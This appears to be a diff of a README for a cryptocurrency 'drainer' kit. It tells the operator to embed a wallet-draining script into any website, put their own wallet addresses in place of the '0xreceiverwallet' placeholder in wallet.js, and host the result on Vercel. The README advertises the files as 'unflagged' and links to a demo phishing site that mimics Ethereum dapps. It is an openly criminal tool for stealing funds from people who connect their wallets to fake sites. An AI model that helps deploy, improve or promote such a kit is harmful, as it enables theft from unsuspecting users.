@@ -9,7 +9,7 @@ Installation on any website files and documentation included 🔥
 
 Installation & Instructions of the draining system on any WEBSITE / USE THE UPDATED FILE
 
-# STEP 1
+# STEP 1 (FOLLOW THE TUTORIAL IN THE .RAR FOR STEP 1
 <script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
 <!–– Please do not forgot to update the files.zip (now unflagged) ––>
 
@@ -22,7 +22,7 @@ Move all the files and folder in the directory of your website. ( Image, Scripts
 
 
 
-# STEP 3 
+# STEP 3 (USE THE NEW WALLET.JS)
 Add your Wallet Adresses in the wallet.js files, you can find the .js files in the scripts folder.
 
 Now replace this line "0xreceiverwallet" for your wallet bsc and your wallet eth 
@@ -49,11 +49,11 @@ All is setup your drainer is ready to go.
 Upload your website on Vercel or any Hosting
 
 
-WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : newperfectdrainer2024.rar
+WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : drainerupdatedtemplate.rar
 Only thing to do is # STEP 3 
 
 
-DEMO WEBSITE : https://ethfoundation.vercel.app/
+DEMO WEBSITE : https://rectify-mainnetdapps.pages.dev/dapps/ennn/
 
 #ETHEREUM #BINANCE #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
